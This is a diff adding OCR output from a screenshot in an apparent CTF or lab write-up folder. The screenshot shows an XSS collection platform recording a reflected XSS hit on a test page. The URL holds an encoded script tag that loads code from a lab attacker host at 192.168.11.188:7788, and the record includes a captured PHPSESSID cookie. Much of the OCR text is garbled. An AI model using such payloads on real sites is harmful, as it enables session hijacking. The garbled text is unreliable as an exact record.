@@ -1,0 +1,43 @@
+# OCR: 587ab271817b7e4c8055bfa53361341b.jpg
+# 来源: .\02-WriteUp\2024\587ab271817b7e4c8055bfa53361341b.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:29
+
+SARE
+PAE
+s
+ERS
+IRB BFK: glyhoutai
+Domain: | 238
+掌 QJE nttp'//192. 168.217. 188:7788/do/auth’37dc7 0e8bb7#dbc7cb05687e58858244 ( 加 domainixx TSS MES)
+J = E OAS
+荣 2024-05-21 。 location : http:/jinsha.abejjin
+10:47:10 salinsalvullxssixss_reflecte
+_get php?message=%3Csc
+ript src%3Dhttp%3A%2F%2
+F192.168.11.188%3A7788%
+‘2FHWw4112%3F171625960
+8%3E%IC%IFSCrIpI%SERS
+ubmit=submit
++ toplocation : nttp:/jinsha.ab
+ojinsajinsarvulixssixss_refle
+cted_get php?message=%3
+Cscript src%3Dhttp%3A%2
+F%2F192.168.11.188%3A77
+88%2FHw4112%3F17 16259
+608%3E%3C%2FScript%3E
+&submit=submit
++ cookie - PHPSESSID=okuds
+nmm3tagjkph6s0jg394
++ opener
+Request Headers E
+HTP_ReFEReR-tpJjns
+ha.abe/
+HTTP_USER_AGENT : Moz
+ila/5.0 (Windows NT 10.0:
+Win64: x64) AppleWebkits3
+7.36 (KHTML, like Gecko) c
+hrome/124.0.0.0 Safar/537.
+36
+REMOTE_ADDR : 192.168.
+14
